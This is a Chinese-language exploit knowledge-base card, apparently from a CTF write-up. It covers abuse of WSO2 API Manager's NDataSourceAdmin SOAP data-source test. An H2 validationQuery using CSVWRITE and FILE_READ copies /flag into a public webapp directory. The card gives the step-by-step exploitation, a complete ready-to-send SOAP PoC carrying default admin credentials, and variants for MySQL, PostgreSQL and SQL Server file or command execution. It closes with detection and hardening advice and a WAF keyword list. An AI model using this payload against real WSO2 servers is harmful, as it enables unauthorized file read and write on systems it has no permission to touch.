---
id: web-java-component-wso2-ndatasourceadmin-h2-validationquery-file-read
title: WSO2 API Manager 数据源测试 SOAP 接口：H2 validationQuery 用 CSVWRITE+FILE_READ 写 webapp 读 flag
type: scenario
domain: web
path: web/java/component
technique: wso2-ndatasourceadmin-h2-validationquery-file-read
tags:
- java
- wso2
- soap
- axis2
- h2
- jdbc
- datasource
- file-read
- file-write
- validation-query
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V123
  verified_at: '2026-11-06T04:30:21+08:00'
  notes: 已对照原文与13张图核对：WSO2 管理台（Version 4.6.0、Repository Location file:/opt/wso2am/repository/deployment/server/）、/carbon/admin/login.jsp、NDataSourceAdminService→DataSourceRepository→RDBMSDataSourceReader 调用链、;init= 拦截、validationQuery trim 后 >280 报错、SOAP 返回 <ns:return>true</ns:return>、publisher/flag123.txt 读取 flag 均与原文/截图一致；CSVWRITE+FILE_READ payload 长度低于 280。已将“去空格后”修正为“trim() 后”。截图为目标环境 4.6.0，非受影响区间，未设置 versions；frontmatter 无 sources/source_url。未验证点：本库未复跑该 SOAP 请求。
url: /docs/web/java/component/web-java-component-wso2-ndatasourceadmin-h2-validationquery-file-read/
draft: false
kb_aliases:
- WSO2 NDataSourceAdminService
- WSO2 testDataSourceConnection
- H2 validationQuery 文件读写
- H2 CSVWRITE FILE_READ
- WSO2 SOAP 数据源 RCE
- WSO2 API Manager 漏洞
---

## 一句话结论

WSO2 API Manager 的 `NDataSourceAdminService#testDataSourceConnection` 允许管理员通过 SOAP 提交任意 RDBMS 数据源 XML；代码只拦 URL 中的 `;init=` 且限制 `validationQuery` 长度 280，不拦 SQL 文件函数。用 H2 的 `CALL CSVWRITE('<webapp 路径>','SELECT FILE_READ(''/flag'')')` 作 validationQuery，即可把 `/flag` 写到 `publisher` webapp 目录，再访问 `/publisher/flag123.txt` 读取。

## 原理

- **入口与调用链**：WSO2 Carbon 管理服务 `/services/NDataSourceAdmin`，SOAPAction `urn:testDataSourceConnection`，需要管理员 Basic 认证。调用链为 `NDataSourceAdminService#testDataSourceConnection` → `DataSourceRepository#testDataSourceConnection` → `RDBMSDataSourceReader#testDataSourceConnection`。
- **数据源配置可控**：SOAP 的 `dsmInfo.definition.dsXMLConfiguration` 是一段 XML，包含 `<url>`、`<username>`、`<password>`、`<driverClassName>`、`<validationQuery>`。服务端用 `loadConfig` 解析后 `Class.forName(driver)`、`DriverManager.getConnection(url, ...)`，再对同一连接执行 `prepareStatement(validationQuery.trim()).execute()`。
- **两处限制**：
  - URL 转小写后包含 `;init=` 直接抛异常（阻止 H2 `INIT=RUNSCRIPT` 类 RCE）；
  - `validationQuery` 经 `trim()` 后长度 >280 抛 `Validation query is too long`。
- **绕过思路**：不碰 `;init=`，把恶意 SQL 放进 `validationQuery`；不用需要大段 Java 代码的 `CREATE ALIAS ... AS $$...$$`（会超过 280），改用 H2 内置文件函数：
  - `FILE_READ('/flag')` 读取文件内容；
  - `CSVWRITE('repository/deployment/server/webapps/publisher/flag123.txt','SELECT FILE_READ(''/flag'')')` 把查询结果写成 CSV 文件。
  - 整条 `CALL CSVWRITE(...)` 很短，低于 280 字符。
- **为什么能读回**：WSO2 工作目录为 `/opt/wso2am`，`repository/deployment/server/webapps/publisher/` 是 publisher webapp 的根；写入的 `flag123.txt` 可通过 `https://host/publisher/flag123.txt` 直接访问。
- **权限**：数据源测试以 WSO2 进程权限执行 SQL，H2 文件函数能读写进程可访问的路径；写入 webapp 目录后由 Web 容器静态提供。

## 触发条件

- 目标为 WSO2 API Manager/Carbon，`NDataSourceAdmin` SOAP 服务可达，且攻击者拥有管理员凭据（默认/弱口令/配置泄露）。
- 服务端加载 H2 驱动（`org.h2.Driver`），且允许在 validationQuery 中执行任意 SQL。
- WSO2 进程对 `repository/deployment/server/webapps/<app>/` 有写权限，且该 webapp 可被外部访问。
- 目标文件（如 `/flag`）对 WSO2 进程可读；validationQuery 长度限制 ≤280 时需用短 payload。

## 利用步骤

1. 访问 `/carbon/admin/login.jsp` 登录管理台；从 `repository/conf/deployment.toml` 的 `[super_admin]` 或默认口令获取管理员凭据。
2. 确认 `/services/NDataSourceAdmin` 可达，SOAPAction 为 `urn:testDataSourceConnection`。
3. 构造 `dsmInfo`：H2 内存 URL（不带 `;init=`）、`org.h2.Driver`、短 validationQuery：
   ```sql
   CALL CSVWRITE('repository/deployment/server/webapps/publisher/flag123.txt','SELECT FILE_READ(''/flag'')')
   ```
4. 发送 SOAP 请求；响应 `<ns:return>true</ns:return>` 表示数据源测试成功、SQL 已执行。
5. 访问 `/publisher/flag123.txt` 读取写入的 flag。
6. 若长度仍超限，缩短文件名/路径、改用 `FILE_READ` 直接返回（若响应回显 SQL 错误/结果），或换其他可写 webapp 目录。

## PoC

```http
POST /services/NDataSourceAdmin HTTP/1.1
Host: target:9443
Authorization: Basic YWRtaW46YWJjZDEyMzQ=
Content-Type: text/xml; charset=utf-8
SOAPAction: urn:testDataSourceConnection
Connection: close

<?xml version='1.0' encoding='utf-8'?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header/>
  <soapenv:Body>
    <xsd:testDataSourceConnection xmlns:xsd="http://org.apache.axis2/xsd">
      <xsd:dsmInfo>
        <ax:name xmlns:ax="http://services.core.ndatasource.carbon.wso2.org/xsd">verifyflag</ax:name>
        <ax:description xmlns:ax="http://services.core.ndatasource.carbon.wso2.org/xsd">verifyflag</ax:description>
        <ax:jndiConfig xmlns:ax="http://services.core.ndatasource.carbon.wso2.org/xsd">
          <ax2:name xmlns:ax2="http://core.ndatasource.carbon.wso2.org/xsd">jdbc/verifyflag</ax2:name>
          <ax2:useDataSourceFactory xmlns:ax2="http://core.ndatasource.carbon.wso2.org/xsd">false</ax2:useDataSourceFactory>
        </ax:jndiConfig>
        <ax:definition xmlns:ax="http://services.core.ndatasource.carbon.wso2.org/xsd">
          <ax:dsXMLConfiguration>&lt;configuration&gt;&lt;url&gt;jdbc:h2:mem:verifyflag;DB_CLOSE_DELAY=-1&lt;/url&gt;&lt;username&gt;sa&lt;/username&gt;&lt;password&gt;&lt;/password&gt;&lt;driverClassName&gt;org.h2.Driver&lt;/driverClassName&gt;&lt;validationQuery&gt;CALL CSVWRITE('repository/deployment/server/webapps/publisher/flag123.txt','SELECT FILE_READ(''/flag'')')&lt;/validationQuery&gt;&lt;/configuration&gt;</ax:dsXMLConfiguration>
          <ax:type>RDBMS</ax:type>
        </ax:definition>
        <ax:system xmlns:ax="http://services.core.ndatasource.carbon.wso2.org/xsd">false</ax:system>
      </xsd:dsmInfo>
    </xsd:testDataSourceConnection>
  </soapenv:Body>
</soapenv:Envelope>
```

随后：

```http
GET /publisher/flag123.txt HTTP/1.1
Host: target:9443
```

## 变体与关联

- **H2 文件函数变体**：`FILE_READ`、`CSVWRITE`、`CSVREAD`、`RUNSCRIPT`；`CREATE ALIAS` + Java 代码可 RCE，但容易超过 280 字符。
- **写入位置变体**：`publisher`/`store`/`admin` 等 webapp 目录、`repository/deployment/server/webapps/ROOT/`、可访问的静态目录；按目标实际部署调整。
- **数据库变体**：MySQL `LOAD_FILE`/`INTO OUTFILE`、PostgreSQL `COPY ... TO/FROM PROGRAM`、SQL Server `xp_cmdshell`；取决于驱动与权限。
- **入口变体**：其他 WSO2 数据源管理服务/管理 API；只要能把 `dsXMLConfiguration` 的 URL/validationQuery 传进去。
- **关联卡片**：[[web-java-component-h2-jdbc-url-filter-bypass-runscript]]（H2 JDBC URL 过滤绕过）、[[web-java-component-hertzbeat-h2-jdbc-url-bypass-rce]]（H2 JDBC URL 注入 RCE）、[[web-java-deserialization-h2-jdbc-init-create-alias-rce]]（H2 `;init=` + CREATE ALIAS）、[[web-java-component-aj-report-datasource-testconnection-jdbc-local-infile-read]]（数据源测试 JDBC 本地文件读取）。
- **边界**：服务未暴露、无管理员凭据、H2 驱动未加载、validationQuery 被更强过滤（禁止 `CALL`/`FILE_READ`/`CSVWRITE`）、webapp 目录不可写时失效。

## 检测与防御

- **检测特征**：`/services/NDataSourceAdmin` 的 `testDataSourceConnection` 请求中出现 `validationQuery`、`CSVWRITE`、`FILE_READ`、`jdbc:h2`；响应 `return>true` 后紧跟对 webapp 静态文件的访问。
- **修复**：
  - 不向非必要用户暴露 `NDataSourceAdmin` 管理服务，按最小权限关闭/隔离；
  - 强制管理员强口令，修改默认 `admin/abcd1234`；
  - 数据源测试只允许白名单驱动/URL，禁止 H2 内存库与文件函数；
  - 对 `validationQuery` 做 SQL 白名单（仅允许 `SELECT 1` 等），而不是只限长度；
  - webapp 目录对 WSO2 进程只读，或部署与运行目录分离。
- **WAF**：拦截 `CSVWRITE`、`FILE_READ`、`CREATE ALIAS`、`;init=`、`RUNSCRIPT` 等关键字；但根本修复在服务端白名单。
